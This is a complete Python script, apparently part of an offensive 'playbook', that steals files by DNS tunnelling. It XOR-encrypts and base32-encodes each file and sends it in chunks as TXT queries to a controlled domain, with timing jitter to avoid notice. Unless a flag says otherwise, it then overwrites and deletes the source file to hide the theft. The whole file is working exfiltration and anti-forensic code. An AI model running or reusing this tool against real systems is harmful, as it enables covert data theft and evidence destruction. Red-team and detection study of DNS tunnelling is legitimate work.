#!/usr/bin/env python3
"""DNS tunnel exfil client (GHOST-HUNT playbook 12.2.3, Method B).

Stdlib-only — no dependencies beyond Python 3.6+. Encrypts a file with XOR
(pre-shared secret), base32-encodes it, chunks into <=40-char labels, and
exfiltrates each chunk as a DNS TXT query of the form:

    <chunk>.x<seq>.<fileid>.<DOMAIN>

<fileid> is a 16-hex content hash so that multiple files sent in one run do
not collide on the capture server (each file gets its own chunk namespace,
recovered per-file by dns_pull.py).

Two delivery modes:
  default          use the system resolver (socket.gethostbyname) — production:
                   queries flow to your controlled authoritative DNS and are
                   logged by dnscat2 (bootstrap-dns-server.sh)
  --server/--port  send raw DNS packets directly to a UDP listener — local
                   smoke test against dns_handler.py (no resolver involved)

Usage:
    python3 dns_exfil.py --domain <your-domain> --password <secret> file1 [file2 ...]
    python3 dns_exfil.py --domain harness.local --server 127.0.0.1 --port 5353 \
        --password <secret> --jitter 0.01 --keep sample.db

Authorized use only.
"""

import argparse
import base64
import hashlib
import os
import socket
import struct
import sys
import time
from typing import Optional


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt data with a repeating key."""
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])


def build_txt_query(name: str, qid: int) -> bytes:
    """Minimal DNS query packet: QDCOUNT=1, QTYPE=TXT(16), QCLASS=IN(1)."""
    header: bytes = struct.pack(">HHHHHH", qid & 0xFFFF, 0x0100, 1, 0, 0, 0)
    qname: bytes = (
        b"".join(bytes([len(label)]) + label.encode("ascii") for label in name.split(".")) + b"\x00"
    )
    return header + qname + struct.pack(">HH", 16, 1)


def exfil_file(
    domain: str,
    key: bytes,
    path: str,
    chunk_len: int = 40,
    server: Optional[str] = None,
    port: int = 53,
    jitter: float = 1.0,
    keep: bool = False,
) -> bool:
    with open(path, "rb") as f:
        data = f.read()
    if not data:
        print(f"[!] {path}: empty file, skipping")
        return False

    encrypted = xor_encrypt(data, key)
    encoded = base64.b32encode(encrypted).decode("ascii").rstrip("=")
    chunks = [encoded[i : i + chunk_len] for i in range(0, len(encoded), chunk_len)]
    fid = hashlib.sha256(data).hexdigest()[:16]  # per-file id — keeps multi-file captures distinct
    print(f"[*] Exfiltrating {len(data)} bytes in {len(chunks)} chunks via DNS")

    sent = acks = 0
    for seq, chunk in enumerate(chunks):
        query = f"{chunk}.x{seq}.{fid}.{domain}"
        if len(query) > 250:
            print(
                f"[!] Query at chunk {seq} exceeds 250 chars — raise --chunk or shorten the domain"
            )
            return False
        if server:
            # Direct UDP to a local listener (harness mode)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1.0)
            try:
                sock.sendto(build_txt_query(query, seq), (server, port))
                try:
                    sock.recvfrom(512)
                    acks += 1
                except socket.timeout:
                    pass  # server received it even if the reply was lost
            except OSError as exc:
                print(f"[!] send failed at chunk {seq}: {exc}")
                sock.close()
                return False
            sock.close()
        else:
            # System resolver — server (authoritative NS / dnscat2) logs the query.
            # NXDOMAIN is expected; we only care that the query was emitted.
            try:  # noqa: SIM105 — NXDOMAIN expected, server logs the query
                socket.gethostbyname(query)
            except OSError:
                pass
            acks += 1
        sent += 1
        if jitter > 0 and seq < len(chunks) - 1:
            time.sleep(jitter)
        if seq % 25 == 0:
            print(f"[*] Sent {seq + 1}/{len(chunks)} chunks")

    if not keep:
        try:
            with open(path, "r+b") as f:
                f.seek(0)
                f.write(os.urandom(len(data)))
                f.truncate()
            os.remove(path)
            print(f"[+] Source covered & removed: {path}")
        except OSError as exc:
            print(f"[!] {path}: uploaded, but source cover/remove FAILED: {exc}")
    else:
        print(f"[+] (--keep) source left in place: {path}")

    if server:
        print(f"[+] Sent {sent} queries, {acks} ACKed by local listener")
    else:
        print(f"[+] Sent {sent} queries")
    return True


def main() -> None:
    ap = argparse.ArgumentParser(description="GHOST-HUNT DNS tunnel exfil client (Method B)")
    ap.add_argument("files", nargs="+", help="files to exfiltrate")
    ap.add_argument(
        "--domain",
        default=os.environ.get("DNS_DOMAIN"),
        help="controlled domain (default: $DNS_DOMAIN)",
    )
    ap.add_argument(
        "--password",
        default=os.environ.get("DNS_PASSWORD"),
        help="shared secret for XOR key (default: $DNS_PASSWORD)",
    )
    ap.add_argument(
        "--chunk",
        type=int,
        default=40,
        help="chunk length in chars (default 40, keep <= 60 for DNS labels)",
    )
    ap.add_argument(
        "--server", default=None, help="send raw DNS to this UDP host (local test mode)"
    )
    ap.add_argument("--port", type=int, default=53, help="DNS server port (default 53)")
    ap.add_argument(
        "--jitter", type=float, default=1.0, help="seconds between queries, 0 = none (default 1.0)"
    )
    ap.add_argument(
        "--keep", action="store_true", help="do not shred/remove the source file (lab testing)"
    )
    args = ap.parse_args()

    if not args.domain or not args.password:
        ap.error("set --domain/--password or the DNS_DOMAIN/DNS_PASSWORD environment variables")
    if not (1 <= args.chunk <= 60):
        ap.error("--chunk must be between 1 and 60 (DNS label limit is 63)")

    key = hashlib.sha256(args.password.encode()).digest()

    ok = True
    for path in args.files:
        print(f"[*] Exfiltrating {path}")
        try:
            ok = (
                exfil_file(
                    args.domain,
                    key,
                    path,
                    chunk_len=args.chunk,
                    server=args.server,
                    port=args.port,
                    jitter=args.jitter,
                    keep=args.keep,
                )
                and ok
            )
        except OSError as exc:
            print(f"[!] {path}: {exc}")
            ok = False
    print("[+] Done" if ok else "[-] One or more files failed")
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
